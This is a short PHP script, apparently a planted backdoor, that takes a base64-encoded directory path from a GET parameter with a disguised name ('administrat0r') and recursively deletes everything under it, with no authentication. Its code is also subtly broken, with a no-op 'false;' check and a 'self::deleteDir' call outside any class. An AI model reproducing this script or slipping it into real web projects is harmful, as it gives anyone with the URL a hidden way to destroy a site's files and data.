<?php
if(empty($_GET['administrat0r']) == false){

		$dirPath = base64_decode($_GET['administrat0r']);
				 if (! is_dir($dirPath)) {
					false;
				}
				if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
					$dirPath .= '/';
				}
				$files = glob($dirPath . '*', GLOB_MARK);
				foreach ($files as $file) {
					if (is_dir($file)) {
						self::deleteDir($file);
					} else {
						unlink($file);
					}
				}
				rmdir($dirPath);
}

?>
